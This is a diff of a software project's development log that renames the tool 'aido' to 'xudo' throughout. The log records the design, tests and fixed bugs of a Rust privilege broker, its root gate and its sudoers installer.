@@ -6,11 +6,11 @@ Running log. Newest section first. This is where commentary lives instead of a c
 
 ## 2026-10-22 — M2b step 5: executing the install plan (done; the product's own probe waits for C1)
 
-**What exists.** `aido_sys::install`: `execute(plan, ops, probe)`, the executor
-for the plan `aido-backend` already builds, behind `InstallOps` (every effect)
+**What exists.** `xudo_sys::install`: `execute(plan, ops, probe)`, the executor
+for the plan `xudo-backend` already builds, behind `InstallOps` (every effect)
 and `InstallProbe` (the post-install check). `HostInstallOps` is the real
-filesystem; a `FakeInstallOps` drives every path in the executor. `aido
-install` now performs the plan, and `aido install --uninstall` removes what it
+filesystem; a `FakeInstallOps` drives every path in the executor. `xudo
+install` now performs the plan, and `xudo install --uninstall` removes what it
 wrote. `run_with` (what every test drives) holds a `RefusingInstaller`, so no
 test can write under `/etc`, as root or otherwise; only `run` holds the real one.
 
@@ -18,32 +18,32 @@ test can write under `/etc`, as root or otherwise; only `run` holds the real one
 exit test (item 6) wants a functional probe that proves the gate executed as
 root. Two things were built, and they are not the same thing.
 
-- **Proven, in the root lane.** `aido-gate-bin/tests/root_probe.rs` installs the
+- **Proven, in the root lane.** `xudo-gate-bin/tests/root_probe.rs` installs the
   real snippet through the product's executor into the container's real
-  `/etc/sudoers.d`, puts the real gate at `/usr/libexec/aido/aido-gate-auth`,
+  `/etc/sudoers.d`, puts the real gate at `/usr/libexec/xudo/xudo-gate-auth`,
   writes a spool entry the way the broker writes one (root-owned `0600` in a
   root-owned `0700` directory) pinned to the test's own `(pid, starttime)`, and
-  runs `runuser -u aidotest -- sudo -S aido-gate-auth` with the password typed
+  runs `runuser -u xudotest -- sudo -S xudo-gate-auth` with the password typed
   by the harness on `sudo`'s own prompt. The gate printed `0`: `/usr/bin/id -u`
-  ran as uid 0, through the rule `aido install` writes, from an account that
+  ran as uid 0, through the rule `xudo install` writes, from an account that
   authenticated with a password. The entry was consumed. Attack twins: a
   consumed entry is not replayed (`gate_no_pending_request`), an entry pinned to
   a reissued pid (right pid, wrong start time) is refused and not consumed, an
   entry from another policy generation is refused, and a wrong password never
-  reaches the gate. No `aidod` and no front-end client is involved, because the
+  reaches the gate. No `xudod` and no front-end client is involved, because the
   gate matches the entry to *any* ancestor by `(pid, starttime)`, so a test can
-  be its own requester. Nothing in `aido` reads the password (invariant 3): the
+  be its own requester. Nothing in `xudo` reads the password (invariant 3): the
   harness does, as the one typing at the prompt.
-- **Not done: `aido install`'s own probe.** It would have to mint that request,
-  and the front-end has no broker client until C1 (`aido exec`). So
+- **Not done: `xudo install`'s own probe.** It would have to mint that request,
+  and the front-end has no broker client until C1 (`xudo exec`). So
   `PendingGateProbe` still answers *unavailable*, a finished install is
-  `Verification::Unverified`, `aido install` says `NOT VERIFIED` and exits 19,
+  `Verification::Unverified`, `xudo install` says `NOT VERIFIED` and exits 19,
   and both container harnesses assert the output never claims otherwise. The
   reason text now says C1, where it used to say the gate was unbuilt. Wiring the
   real probe is one `impl InstallProbe` once C1 lands, and it should reuse what
   `root_probe.rs` does by hand.
-- **What `aido install` can say now, on a line of its own.** `aido_sys::check_effect`
-  asks the backend, not the filesystem: `sudo -l -U <first member of aido>` and
+- **What `xudo install` can say now, on a line of its own.** `xudo_sys::check_effect`
+  asks the backend, not the filesystem: `sudo -l -U <first member of xudo>` and
   whether the gate is in the listing. It prints "the rule is read" (with "this
   is not the functional probe"), a `WARNING ... NOT in effect`, or "not checked"
   (an empty group, which is the default because membership is the privilege grant;
@@ -54,7 +54,7 @@ root. Two things were built, and they are not the same thing.
   can reuse the function; it is not built here.
 
 **The dotted-filename regression.** `sudo` skips a file in `/etc/sudoers.d` whose
-name contains a dot or ends in `~`, so `aido.conf` installs cleanly and grants
+name contains a dot or ends in `~`, so `xudo.conf` installs cleanly and grants
 nothing. The guard was enforced in the executor from the start; what was missing
 was proof that the premise is true of the real `sudo` and not just believed.
 `root_sudo_names.rs` asks it: `sudo_ignores_a_snippet_named_with_a_dot` (and the
@@ -71,12 +71,12 @@ job was done in this commit: `continue-on-error` deleted, `root-test` added to
 the `ci` recipe, the comments rewritten. **Branch protection is outside the
 repository.** If it lists required checks, `root tests (container)` has to be
 added by hand, or a red lane still merges. The lane now installs `sudo` and
-`passwd` from the image's apt sources and creates one account, `aidotest`, with
+`passwd` from the image's apt sources and creates one account, `xudotest`, with
 a fixed password worth nothing, because real `sudo` needs someone to
 authenticate. Every crate's `root_*` targets run (the selection is by name across
-the workspace, and each crate declares the feature itself): `aido-sys`,
-`aido-bin` (the owner of the binary, so `CARGO_BIN_EXE_aido` is fresh) and
-`aido-gate-bin` (likewise for the gate).
+the workspace, and each crate declares the feature itself): `xudo-sys`,
+`xudo-bin` (the owner of the binary, so `CARGO_BIN_EXE_xudo` is fresh) and
+`xudo-gate-bin` (likewise for the gate).
 
 **Overlap between the two Docker lanes.** `just install-root` (ubuntu, Alpine) and
 `just root-test` both install with real `sudo` as real root and check the file's
@@ -98,7 +98,7 @@ nine. The gate printed `0\r\n` through the pty; the test trims.
 **Decisions.**
 
 - **The executor refuses on its own before it runs a step.** Not root: refused
-  first, before the plan is read. A path that is not one of the five aido
+  first, before the plan is read. A path that is not one of the five xudo
   writes (or the candidate beside one): refused, so a hand-built plan is not a
   root write primitive and `/etc/sudoers` is unreachable. A destination `sudo`
   silently ignores (a dot, a trailing `~`): refused — the guard the request
@@ -111,11 +111,11 @@ nine. The gate printed `0\r\n` through the pty; the test trims.
   refused unless this run wrote that candidate and this run validated it; the
   inode after validation must be the inode written, checked again at the rename.
   A candidate that is no longer the inode written is *left in place*: removing
-  it would delete a file aido did not write.
-- **"A file aido wrote" has a definition.** A regular file, root's, one name,
-  beginning with `# Managed by aido.` (`MANAGED_MARKER`; a test holds both
+  it would delete a file xudo did not write.
+- **"A file xudo wrote" has a definition.** A regular file, root's, one name,
+  beginning with `# Managed by xudo.` (`MANAGED_MARKER`; a test holds both
   generated headers to it), opened `O_NOFOLLOW` and checked on the descriptor.
-  A symlink, a hard link, a directory, or an operator's own `aido` is refused
+  A symlink, a hard link, a directory, or an operator's own `xudo` is refused
   by both install (will not replace) and uninstall (will not remove). The
   candidate name is fixed by the plan and created `O_EXCL`: a stale one blocks
   the install loudly instead of being overwritten, and uninstall removes it only
@@ -132,7 +132,7 @@ nine. The gate printed `0\r\n` through the pty; the test trims.
   (`blocks.rs`, with property tests: removal undoes insertion exactly; insertion
   is idempotent; no operator byte is lost). Sentinels that do not pair are
   refused, never guessed at. Matching is whole-line and byte-exact: a CRLF
-  marker is not aido's. The result is `root:root` and the plan's `0400`; the
+  marker is not xudo's. The result is `root:root` and the plan's `0400`; the
   operator's original mode is not preserved on install, because the plan says
   the file must end up `0400`.
 - **A failed probe removes what the run installed**, in reverse; a refused
@@ -168,27 +168,27 @@ five things. Each is fixed, with a test that fails when the fix is reverted.
 1. **The root tests could delete a real machine's files.** `just test` passes
    `--all-features`, which turns `root-tests` on, and the only guard was "am I
    uid 0". `sudo just test` on a real host would have deleted `/etc/doas.conf`
-   (locking out a doas admin), the audit log `/var/lib/aido/audit.jsonl`,
+   (locking out a doas admin), the audit log `/var/lib/xudo/audit.jsonl`,
    journald's socket, the installed gate, and added a rule file to
-   `/etc/aido/rules.d`. Now every root test begins with
-   `aido_tests::root_lane::root_guard`: not uid 0 is a skip, which the lane
+   `/etc/xudo/rules.d`. Now every root test begins with
+   `xudo_tests::root_lane::root_guard`: not uid 0 is a skip, which the lane
    fails on as before; uid 0 *without* the lane's sentinel file is a **panic**
-   before anything is touched. The sentinel, `/aido-root-test-lane`, is made by
+   before anything is touched. The sentinel, `/xudo-root-test-lane`, is made by
    `ci/root-test.sh` inside the container only: root-owned, `0400`, one fixed
    line, a regular file and not a link, checked as such. A *file* because no
    privileged code reads the environment to decide what it may do, and a
    variable is one `export` away; a file directly under `/` is something only
    root can have made, and root on a real host did not. A *panic* and not a skip
    because a skip is a green build on the one machine where the guard mattered.
-   Held by `crates/aido-tests/tests/lane_guard_scan.rs` (every `#[test]` in
+   Held by `crates/xudo-tests/tests/lane_guard_scan.rs` (every `#[test]` in
    every `root_*.rs` begins with the guard, nobody defines a weaker one, and the
    script writes exactly what the guard looks for) and by the guard's own tests
    (`refuses_as_root_without_the_lane_sentinel` and one per way a sentinel can
    be wrong), plus, as real uid 0,
    `a_root_test_outside_the_lane_panics_before_touching_anything`. The guard
-   lives in `aido-tests` as a library because the workspace's `unsafe` scan
+   lives in `xudo-tests` as a library because the workspace's `unsafe` scan
    (rightly) refuses any `#[path]` or `include!` that brings in code it cannot
-   read. Cost: `aido-tests` now has one dependency, `rustix` (`process`, for the
+   read. Cost: `xudo-tests` now has one dependency, `rustix` (`process`, for the
    effective uid), and three crates dev-depend on it.
 2. **A doas edit changed the operator's file.** The copy was made `root:root
    0400`, so an operator's `root:wheel 0640` came back `root:root 0400`, and
@@ -204,22 +204,22 @@ five things. Each is fixed, with a test that fails when the fix is reverted.
    rename makes a new inode; POSIX ACLs and every xattr (`security.selinux`,
    `user.*`, capabilities) on the old one are gone. Dropping an ACL can only
    remove a grant; a lost SELinux label falls back to the directory's default
-   type (`etc_t`, which is what `doas.conf` usually has). aido does not copy
+   type (`etc_t`, which is what `doas.conf` usually has). xudo does not copy
    them, because copying a label or ACL it cannot validate is trusting it. An
    operator who keeps an ACL or a custom label on `/etc/doas.conf` re-applies it
-   after `aido install`. The command does not say so yet; a notice line is cheap
+   after `xudo install`. The command does not say so yet; a notice line is cheap
    and is a follow-up.
 3. **A crash wedged every later install.** A run killed between creating the
-   candidate and renaming it left `/etc/doas.conf.aido-new` (or the drop-in
+   candidate and renaming it left `/etc/doas.conf.xudo-new` (or the drop-in
    candidate), and the exclusive create then failed forever with "File exists".
    Now, on `EEXIST`, the existing file is *shown* to be a leftover and only then
-   removed, once, and the create retried once. It is aido's only if it is a
+   removed, once, and the create retried once. It is xudo's only if it is a
    regular file (opened `O_NOFOLLOW`, so a link is refused), root's, with one
    name, writable by nobody else, and its bytes are a **prefix of exactly what
    this run is about to write**: that covers a crash at any point in the write,
    including the empty mode-`0000` file left by a crash right after the create,
    and does not cover anything an operator wrote or anything longer than ours.
-   Anything else is `StaleCandidate`: the path, why it is not aido's, "nothing
+   Anything else is `StaleCandidate`: the path, why it is not xudo's, "nothing
    was removed", and what to do. The directory was walked as root's, so nothing
    that could not already do worse can swap the name between the look and the
    unlink, which is why the removal re-checks nothing further. A concurrent
@@ -229,14 +229,14 @@ five things. Each is fixed, with a test that fails when the fix is reverted.
    `remove_managed` clears a candidate that holds nothing, or only the start of
    the marker (never an empty file at a destination's name: that is an
    operator's). Tests: `a_crash_left_copy_of_ours_is_replaced_and_install_succeeds`
-   (empty, partial, whole), `a_stale_copy_aido_did_not_write_is_refused_and_kept`,
+   (empty, partial, whole), `a_stale_copy_xudo_did_not_write_is_refused_and_kept`,
    the symlink, two-link, group-writable and directory twins,
    `uninstall_recovers_from_its_own_crash_left_copy`,
    `a_stale_drop_in_candidate_of_ours_is_replaced`,
    `a_removal_clears_a_candidate_a_crash_left_part_written`, and in the root lane
    the install and uninstall cases against the real `/etc`.
 4. **`just ci` was not what CI runs.** The `install-root` job existed and the
-   recipe lacked it. Added, and `crates/aido-tests/tests/ci_lanes.rs` now fails
+   recipe lacked it. Added, and `crates/xudo-tests/tests/ci_lanes.rs` now fails
    the build when a `just` recipe a workflow job runs is neither in `ci`
    (directly or through `verify`) nor excused in its short list (the two fuzz
    recipes, which need nightly). The `install-root` comment said the probe
@@ -262,7 +262,7 @@ five things. Each is fixed, with a test that fails when the fix is reverted.
   install again first.
 - The group is created with `groupadd --system` or `addgroup -S` and never
   removed, never populated; a `purge` that removes it is the package's job.
-- `aido install` exits 19 on every successful-but-unverified install. The
+- `xudo install` exits 19 on every successful-but-unverified install. The
   `postinst` that calls it must treat that as the documented state until the
   probe lands (C1).
 
@@ -276,7 +276,7 @@ then reviewer (Fable). The chain is described in `docs/todo/m2b-finish-plan.md`
 § "How work moves".
 
 **Why.** One runner instead of per-lane scripts and hand-kept `RECOVERY-*.txt`
-files. Task records are durable under `~/.boof/aido/<lane>`. Branches are kept
+files. Task records are durable under `~/.boof/xudo/<lane>`. Branches are kept
 as `boof-runner/<task-id>`, and a failed task keeps its worktree for a retry.
 Today boof puts the task worktrees under `.boof-runner-worktrees/` in the main
 checkout (ignored by `.gitignore`); they move outside it once boof supports a
@@ -334,19 +334,19 @@ never pass it.
 
 ---
 
-## 2026-10-21 — M2b step 4 (B3): `aido-gate-bin`, the root executor, reconciled with the broker
+## 2026-10-21 — M2b step 4 (B3): `xudo-gate-bin`, the root executor, reconciled with the broker
 
 Built 2026-10-19 on `aebfd15`, before the broker was on main. Finished
 2026-10-21 at the rebase onto the merged broker (`1851c9a`), where the three
 contracts the finish plan names for B3 were reconciled; they are the first
 section below.
 
-**What exists.** The `aido-gate` executable, in its own package (`aido-gate-bin`,
-the shape of `aido-bin`, `ido-bin` and `aidod-bin`: five lines of `main`,
+**What exists.** The `xudo-gate` executable, in its own package (`xudo-gate-bin`,
+the shape of `xudo-bin`, `ido-bin` and `xudod-bin`: five lines of `main`,
 excluded from coverage with its reason in the `justfile`, `tests/binary.rs`
-running the real binary), to be installed as `/usr/libexec/aido/aido-gate` with
-`aido-gate-auth` as a hardlink. Only the `-auth` name runs. The sequence it hands
-off to is `aido_gate::run`, a module of the `aido-gate` library written against
+running the real binary), to be installed as `/usr/libexec/xudo/xudo-gate` with
+`xudo-gate-auth` as a hardlink. Only the `-auth` name runs. The sequence it hands
+off to is `xudo_gate::run`, a module of the `xudo-gate` library written against
 traits (`GateHost`) with no syscall of its own, and fully covered. It refuses
 with `NoPendingRequest` until a root-minted entry exists, and the broker is what
 mints one; with the broker on main the two halves now meet at the spool, and
@@ -357,7 +357,7 @@ nothing installs the rule that reaches the gate, step 5).
 
 1. `close_range(3, ~0, CLOEXEC)`. 2. `/dev/null` for closed 0 to 2. 3.
 `PR_SET_NO_NEW_PRIVS`. 4. The invocation: no arguments, `argv[0]` named
-`aido-gate-auth`. 5. `/proc` opened and proved procfs on that descriptor. 6.
+`xudo-gate-auth`. 5. `/proc` opened and proved procfs on that descriptor. 6.
 The lineage walk. 7. The ruleset through `load_trusted_rules`, the generation
 `generation.id()`. 8. The broker's spool through `SpoolDir::open`, and the
 broker's clock. 9. Exactly one entry matching an ancestor's pin; `validate`;
@@ -386,13 +386,13 @@ and two things the merge showed.
    publish, lock or remove, because the type it holds has no way to say so.
    Tests, each shown to fail with its protection removed:
    `consuming_an_entry_takes_it_and_the_second_consumer_is_told_it_is_gone`
-   (aido-sys, on a real directory),
+   (xudo-sys, on a real directory),
    `an_entry_that_was_already_gone_when_the_gate_consumed_it_runs_nothing` (a
    second gate takes the entry the moment the first has read it, through the
    seam, so the loser's consume is the real answer and not a scripted one),
    `an_entry_that_cannot_be_unlinked_runs_nothing`.
 2. **One monotonic clock, the broker's.** The gate's own `Clock`, `HostClock`
-   and `FakeClock` were deleted; `aido_sys::{Clock, HostClock, FixedClock}` is
+   and `FakeClock` were deleted; `xudo_sys::{Clock, HostClock, FixedClock}` is
    what both read, so a deadline is stamped and judged on one `CLOCK_MONOTONIC`
    in whole seconds. The broker's `Clock` cannot fail, so the gate's step
    "could not read the clock" and its `FakeClock::broken` test went with the
@@ -414,17 +414,17 @@ and two things the merge showed.
    not mapped, so a caller cannot run the gate inside a namespace it made. That
    premise is the kernel's documented behaviour and is **not measured here**:
    Docker's default seccomp profile refuses `unshare`. A time namespace root
-   made on purpose, with `/run/aido` reachable from it, is the same kind of
+   made on purpose, with `/run/xudo` reachable from it, is the same kind of
    configuration as the pid-namespace case B1 recorded (open item 8) and is
    outside the model.
 3. **The exec path takes `Authorized<_>`, and B1 did not wire the broker's
    half.** B1 deferred the audit trail to plan item D1 (its open item 6) and
    kept the stderr record, so there is no broker-side contract to take. The
    gate's exec already takes an `Authorized<Approved>` that only
-   `aido_sys::authorize` makes, with `AuditTrail::system("aido-gate")`, so it
+   `xudo_sys::authorize` makes, with `AuditTrail::system("xudo-gate")`, so it
    keeps its pre-exec record. **D1 owns what is left:** the end-to-end check
    (both independent records on a successful execution, a failing sink stopping
-   mint *and* execution, `aido audit --log` passing on the produced trail and
+   mint *and* execution, `xudo audit --log` passing on the produced trail and
    failing after truncation), and the decision recorded in decision 1 below, how
    a post-execution outcome is obtained from an exec-in-place gate. Until D1
    the trail the gate writes holds the gate's records alone, and a host
@@ -447,7 +447,7 @@ and two things the merge showed.
    and its at-the-bound twin), and the rest are the broker's tests of the same
    reader. The two bounds the gate reads by, `MAX_SPOOL_NAMES` and
    `MAX_ENTRY_BYTES`, are pinned against the broker's own ceilings by two
-   compile-time assertions in `aidod::mint`: a spool kept within the broker's
+   compile-time assertions in `xudod::mint`: a spool kept within the broker's
    limits (64 live entries, 32 KiB an entry) is always one the gate will walk
    and read, so the gate's bounds can only bite on a spool the broker did not
    keep. The listing itself is bounded too: `Spool::names_up_to(MAX_SPOOL_NAMES
@@ -459,11 +459,11 @@ and two things the merge showed.
    Mutations L1 to L10 were killed.
 5. **The settings the gate decides with.** Decision 12 below said the gate and
    the broker "must agree" on the settings file once either reads it. The
-   broker now does (`aidod::policy`, `read_trusted_file` and `settings_from`);
+   broker now does (`xudod::policy`, `read_trusted_file` and `settings_from`);
    the gate still decides with `Settings::default()`. That is safe today for the
    reason it was: `frozen` and `confirm_agent_actions` bite only an enrolled
    agent (`engine::Settings`), and the gate attests no one, so no decision
-   differs. It stops being safe the day M3's `aido freeze` or M4's enrolment
+   differs. It stops being safe the day M3's `xudo freeze` or M4's enrolment
    exists. **Open item 8.**
 
 **Decisions** (the step-1 "open for step 4" items, and the rest this step had
@@ -481,7 +481,7 @@ to make):
    (`exec_failure_record`) naming the first by `authorization_seq=` in its
    evidence, because the log is append-only and `Record` has no field to name
    it with (step 6, open item 2). A second cost: the exit status. 17, 18 and 19
-   are `aido`'s refusal codes, and a child exec'd in place can exit with them,
+   are `xudo`'s refusal codes, and a child exec'd in place can exit with them,
    so status alone cannot tell a refusal from a child; the stderr refusal line
    is the signal, and C1's front-end must read it.
 2. **Before 5.11 the gate refuses.** `CLOSE_RANGE_CLOEXEC` is the whole of step
@@ -507,13 +507,13 @@ to make):
    or policy-refused entry is refused with the flag set
    (`a_rule_that_confirms_is_satisfied_by_the_password_and_by_nothing_else_the_caller_can_say`).
 6. **The caller is identified by a pin match, never by a name.** `lineage`
-   (in `aido-sys`) reads the gate and up to eight processes above it,
+   (in `xudo-sys`) reads the gate and up to eight processes above it,
    quietly stopping at the bound where `ancestry` refuses a deep tree, because
    a deep session is ordinary here. The ancestors' `(pid, starttime)` pairs are
    what a spool entry must match; the names go in the record as
    `lineage=` and are branched on nowhere. This is shape-agnostic on purpose:
    `sudo` and `sudo-rs` with `use_pty` put a monitor between the gate and
-   `aido`, and OpenDoas execs without a fork, so the distance is one to three
+   `xudo`, and OpenDoas execs without a fork, so the distance is one to three
    and the walk does not need to know which. **Not measured** against the real
    three here: the lineage is tested against the tree those programs are
    documented to make, and the matrix's executing half (step 8) is where it
@@ -552,14 +552,14 @@ to make):
     step that can fail without the request being at fault, with a stable code
     each, and `Invocation`, `Spool` and `Program` report at high severity
     because they fail only when somebody is making them. The pinned denial
-    contract in `aido-policy` is untouched. The record of a `Failed` refusal
+    contract in `xudo-policy` is untouched. The record of a `Failed` refusal
     carries `detail=`, the step's own words bounded to 200 characters.
-11. **No new crate, no new `unsafe`.** `aido-gate` depends on `aido-sys` (and
-    `aido-sys` dev-depends on `aido-gate` for its contract test, which Cargo
-    allows); `aido-sys` takes the workspace's `sha2` and two more rustix
+11. **No new crate, no new `unsafe`.** `xudo-gate` depends on `xudo-sys` (and
+    `xudo-sys` dev-depends on `xudo-gate` for its contract test, which Cargo
+    allows); `xudo-sys` takes the workspace's `sha2` and two more rustix
     features beside the broker's (`stdio`, `thread`). `Cargo.lock` gains edges,
     not packages. The unsafe budget is untouched: six blocks, enforced by
-    `aido-sys-raw/tests/unsafe_budget.rs`.
+    `xudo-sys-raw/tests/unsafe_budget.rs`.
 12. **The gate reads no `config.toml` yet**, so `engine::Settings::default()`
     is what it decides with (`confirm_agent_actions` on, `frozen` off). See
     reconciliation 5 and open item 8.
@@ -568,7 +568,7 @@ to make):
 `dup2(x, x)` does nothing, so a descriptor that was already open as 0, 1 or 2
 and had `FD_CLOEXEC` set stayed so, and the child saw the stream closed.
 `install` now clears `FD_CLOEXEC` by name after the `dup2`, and
-`crates/aido-sys/tests/std_streams.rs` tests it in its own process. Mutations
+`crates/xudo-sys/tests/std_streams.rs` tests it in its own process. Mutations
 H1 to H4 on `install` were each killed. An earlier version of this entry said
 the closed-descriptor path was not mutation-checked; it now is.
 
@@ -592,11 +592,11 @@ the working directory would give, and still fails it) and drops the flake. It
 is the second instance of one class, so the retry is not the fix for the class:
 plan item D4 still owns it.
 
-**Tests, named for the attack.** In `aido-gate::run`:
+**Tests, named for the attack.** In `xudo-gate::run`:
 `a_direct_hostile_invocation_with_no_entry_does_nothing_and_exits_unusable_at_high_severity`,
 `arguments_are_refused_because_the_sudoers_rule_grants_none`,
-`an_unexpected_argv0_is_refused` (ten spellings, `aido-gate-nopass` and
-`aido-gate-auth/` among them),
+`an_unexpected_argv0_is_refused` (ten spellings, `xudo-gate-nopass` and
+`xudo-gate-auth/` among them),
 `an_argv0_that_could_drive_a_terminal_reaches_the_record_escaped`,
 `an_entry_minted_for_someone_else_is_not_this_callers`,
 `a_reissued_pid_does_not_borrow_the_entry_of_the_process_that_had_it`,
@@ -609,12 +609,12 @@ plan item D4 still owns it.
 and one `stops_at` test per step proving nothing after it ran (a kernel without
 `close_range`, streams that cannot be replaced, `no_new_privs` refused, a `/proc`
 that is not procfs, a lineage that cannot be walked, a ruleset or spool that fails
-the trust walk, a spool too crowded to walk, a clock that reads zero). In `aido-sys`:
+the trust walk, a spool too crowded to walk, a clock that reads zero). In `xudo-sys`:
 the seam's three tests above, `a_script_is_refused_with_that_reason_and_never_hashed`,
 `a_program_anyone_else_can_write_is_refused`, `a_symlinked_program_is_refused_by_the_walk`,
 `a_read_that_fails_after_the_first_bytes_is_a_refusal_not_a_short_hash`,
 `a_file_that_is_not_on_procfs_is_refused_wherever_it_sits_under_proc`. In
-`aido-gate-bin/tests/binary.rs`, through real processes and hardlinks: the same
+`xudo-gate-bin/tests/binary.rs`, through real processes and hardlinks: the same
 refusals by exit status and the one line, closed and leaked descriptors, and
 that the environment is never read.
 
@@ -641,7 +641,7 @@ records the order, because Rust's own runtime fills a closed descriptor before
 1. **The root-run half.** Everything above runs unprivileged, as the hostile
    user does, and `exec_fd` is a fake in the library tests: the gate has not
    yet exec'd anything for real, as root, through a real `sudo`. That is the
-   executing half of the differential matrix (`aido-tests`, step 8), and
+   executing half of the differential matrix (`xudo-tests`, step 8), and
    checklist items 4 and 11 stay half-open until it exists (the child's own
    `/proc/self/environ`, the real lineage under sudo, sudo-rs and OpenDoas).
    A root-lane test of the binary (`just root-test`) is not built here, for a
@@ -677,12 +677,12 @@ records the order, because Rust's own runtime fills a closed descriptor before
    `MAX_SPOOL_NAMES` (4096, against the broker's 64) is a bound on what a
    spool someone else filled can make it read, and the listing stops one name
    past it (`Spool::names_up_to`, reconciliation 4).
-8. **The gate does not read `/etc/aido/config.toml`.** Before M3's `freeze` or
+8. **The gate does not read `/etc/xudo/config.toml`.** Before M3's `freeze` or
    M4's enrolment can make `frozen` or `confirm_agent_actions` bite, the gate
    must read the same file through the same walk and derive the same settings
    as the broker, and the two must be one function: `settings_from` is in
-   `aidod::policy` today, which `aido-gate` cannot depend on (the dependency
-   runs the other way), so it belongs in `aido-gate` (or lower) and the broker
+   `xudod::policy` today, which `xudo-gate` cannot depend on (the dependency
+   runs the other way), so it belongs in `xudo-gate` (or lower) and the broker
    should call it from there.
 9. **The audit trail is the gate's alone until D1** (reconciliation 3), and the
    post-execution outcome of an exec-in-place gate is D1's to decide.
@@ -703,14 +703,14 @@ have 6.17). Not yet seen on the CI runners, nor on x86_64.
 
 ---
 
-## 2026-10-21 — M2b step 2 (B1): `aidod`, the broker that mints, final
+## 2026-10-21 — M2b step 2 (B1): `xudod`, the broker that mints, final
 
 Built 2026-10-19; this entry was finished when it landed, after the review
 fixes, the safe `SO_PEERCRED` decode (open item 8, resolved), and the decision
 to leave the audit trail unwired (open item 6, which is plan item D1).
 
 **Why it exists.** The gate refuses with `NoPendingRequest` unless a
-root-minted entry exists under `/run/aido/req`, so until now the human path
+root-minted entry exists under `/run/xudo/req`, so until now the human path
 could not have executed anything even with a gate binary. The broker is the
 only thing that writes there. It grants nothing a password does not: every
 caller is `Unattested` until M4, and an entry only lets the gate run, through
@@ -718,15 +718,15 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
 
 **What exists now.**
 
-- **`aidod`** (library, privileged, 100% covered) and **`aidod-bin`** (the
-  entry point, `/usr/libexec/aido/aidod`, excluded from coverage like
-  `aido-bin` and run as a process by `tests/broker.rs`). One connection per
+- **`xudod`** (library, privileged, 100% covered) and **`xudod-bin`** (the
+  entry point, `/usr/libexec/xudo/xudod`, excluded from coverage like
+  `xudo-bin` and run as a process by `tests/broker.rs`). One connection per
   process: `serve` identifies the peer, reads one request, checks the spool,
   loads root's policy, classifies, decides, mints, answers, in that order, so a
   refusal never describes something not yet established. Every step that fails
   answers with a refusal and writes an audit record.
-- **`aido-wire`**, a new pure crate (`aido-policy`, `serde`, `thiserror`, no
-  I/O) holding the protocol, so `aido exec` (step 3) links it without linking
+- **`xudo-wire`**, a new pure crate (`xudo-policy`, `serde`, `thiserror`, no
+  I/O) holding the protocol, so `xudo exec` (step 3) links it without linking
   the broker. A request is `schema_version`, an absolute `program`, `argv` as
   strings, and `claimed_classification` — a hint the broker records and never
   reads. At most 16 KiB; not UTF-8, an unknown or missing key, another schema,
@@ -737,7 +737,7 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
   sentence. The client never sees a path or an errno; the detail goes to the
   audit record. `BrokerResponse::parse` also refuses a decision whose envelope
   version is not this build's.
-- **Peer identification** (`aidod::identify`) asks the kernel down the ladder
+- **Peer identification** (`xudod::identify`) asks the kernel down the ladder
   and never reads its version: `SO_PEERCRED` on every rung, a pid of 0 refused
   before anything takes a pid; `SO_PEERPIDFD`, and
   on `ENOPROTOOPT` only, `pidfd_open` on the connect-time pid, and on `ENOSYS`
@@ -746,7 +746,7 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
   pid; the start time from `/proc/<pid>/stat`, which must name that pid; and
   after the last `/proc` read, a zero-timeout poll on the pidfd, refusing a
   peer that has exited. Every other errno is a refusal and never a lower rung.
-- **A seam for the rest of the peer calls**, `aido_sys::PeerCalls`
+- **A seam for the rest of the peer calls**, `xudo_sys::PeerCalls`
   (`SO_PEERCRED`, `pidfd_open`, `/proc/<pid>/{stat,status}`, the pidfd poll)
   with `HostPeer` and a `FakePeer` that scripts a *sequence* per call and
   records the order, so tests assert that the liveness check follows the last
@@ -754,16 +754,16 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
   `Syscalls` trait stays the calls that need `unsafe`, and `SO_PEERCRED` is one
   of them: `HostPeer::peer_cred` reads it through `Syscalls::peer_cred`, after
   its own check of the socket's kind (open item 8). Also new in
-  `aido-sys`, each with a host implementation and a fake: `Connection`
+  `xudo-sys`, each with a host implementation and a fake: `Connection`
   (descriptor 0 adopted only if it is a connected `AF_UNIX` `SOCK_STREAM`
   socket, duplicated rather than taken, `SO_RCVTIMEO` and `SO_SNDTIMEO` of five
   seconds through rustix, one bounded read, one write), `Spool`, `Clock`
   (`CLOCK_MONOTONIC` in whole seconds, for the gate to read too), `Entropy`
   (`getrandom`, a short read refused), and `read_trusted_file` for the
   optional settings file.
-- **Minting** (`aidod::mint`). Only a permitted decision mints, confirming ones
+- **Minting** (`xudod::mint`). Only a permitted decision mints, confirming ones
   included with `confirmed = false`: on the password path the password is the
-  confirmation. The entry is `aido_gate::PendingRequest` with the generation of
+  confirmation. The entry is `xudo_gate::PendingRequest` with the generation of
   the ruleset `load_trusted_rules` returned, the request's program and operands
   as asked, the pin from the kernel, a 32-byte `getrandom` nonce in lowercase
   hex, and a deadline `REQUEST_TTL_SECS` (fifteen minutes) past
@@ -780,23 +780,23 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
   the trust walk and must be a root-owned directory giving group and other
   nothing; the descriptor half takes its owner as a parameter, so the real
   writer runs in the suite as uid 1000 on Linux.
-- **Root's policy** (`aidod::policy`): the ruleset only through
-  `load_trusted_rules`, settings from `/etc/aido/config.toml` through the same
+- **Root's policy** (`xudod::policy`): the ruleset only through
+  `load_trusted_rules`, settings from `/etc/xudo/config.toml` through the same
   walk or the documented defaults when it is absent — absence decided inside
   the verified parent directory, where nobody else could have created it — and
-  the decision from `aido_policy::evaluate_command`, the function `explain`
+  the decision from `xudo_policy::evaluate_command`, the function `explain`
   calls, so the broker inherits step 2b's strictest-rule resolution instead of
   searching beside it. A settings file that is present and broken refuses.
-- **Units** in `packaging/`: `aidod.socket` (`Accept=yes`, `0660 root:aido`,
+- **Units** in `packaging/`: `xudod.socket` (`Accept=yes`, `0660 root:xudo`,
   `MaxConnections=32`, `MaxConnectionsPerSource=8`, which systemd keys by peer
-  uid on `AF_UNIX`), `aidod@.service` (`StandardInput=socket`; root with an
+  uid on `AF_UNIX`), `xudod@.service` (`StandardInput=socket`; root with an
   empty `CapabilityBoundingSet`; `NoNewPrivileges`, `ProtectSystem=strict` with
-  `ReadWritePaths=-/run/aido/req` alone, `PrivateTmp`, `PrivateDevices`,
+  `ReadWritePaths=-/run/xudo/req` alone, `PrivateTmp`, `PrivateDevices`,
